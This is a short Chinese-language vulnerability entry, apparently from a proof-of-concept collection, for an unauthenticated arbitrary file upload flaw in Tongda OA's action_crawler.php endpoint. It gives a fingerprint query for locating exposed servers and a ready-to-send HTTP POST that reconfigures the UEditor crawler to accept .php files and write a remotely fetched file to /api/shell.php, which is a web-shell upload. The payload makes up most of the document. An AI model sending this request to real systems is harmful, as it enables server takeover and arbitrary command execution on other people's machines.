﻿# 通达OA action_crawler 前台任意文件上传漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA action_crawler存在前台任意文件上传漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限。影响版本 通达OA 2016 - 通达OA V11.6

> 漏洞特征：title="office Anywhere" && icon_hash="-759108386" && "2016"

> 验证脚本：HTTP

```
POST /module/ueditor/php/action_crawler.php HTTP/1.1
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

CONFIG[catcherPathFormat]=/api/shell&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=https://www.baidu.com/img/flexible/logo/pc/result.png
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/api/shell.php


> 验证文件来源：通达OA action_crawler 前台任意文件上传漏洞.poc
